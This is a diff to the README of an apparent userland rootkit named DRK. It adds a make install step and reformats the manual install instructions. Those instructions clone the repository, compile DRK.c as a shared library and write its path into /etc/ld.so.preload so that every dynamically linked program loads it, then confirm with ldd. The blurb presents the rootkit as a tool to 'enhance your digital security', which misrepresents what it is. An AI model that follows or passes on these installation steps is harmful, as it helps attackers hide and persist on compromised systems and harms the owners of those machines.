@@ -2,19 +2,33 @@
 
 Welcome to my rootkit userland This toolkit offers some cool and interesting functionalities designed to enhance your digital security. Let's dive into what it can do.
 
+## INSTALL MAKE
+
+1) *install with Make*
+```
+# make
+```
 ## INSTALL MANUAL
 
 1) git clone:
-```git clone https://github.com/DARKSECshell/ROOTKIT-USERLAND```
+```
+git clone https://github.com/DARKSECshell/ROOTKIT-USERLAND
+```
 
-2) userland rootkit compilation
-```gcc DRK.c -o DRK.so -shared -fPIC -ldl```
+3) userland rootkit compilation
+```
+gcc DRK.c -o DRK.so -shared -fPIC -ldl
+```
 
-3) moved library for /etc/ld.so.preload
-```echo "$(pwd)/DRK.so" > /etc/ld.so.preload && ldconfig```
+5) moved library for /etc/ld.so.preload
+```
+echo "$(pwd)/DRK.so" > /etc/ld.so.preload && ldconfig
+```
 
-4) Check rk loading
-```ldd /usr/bin/ls```
+7) Check rk loading
+```
+ldd /usr/bin/ls
+```
 
 
 ## Functionality Overview
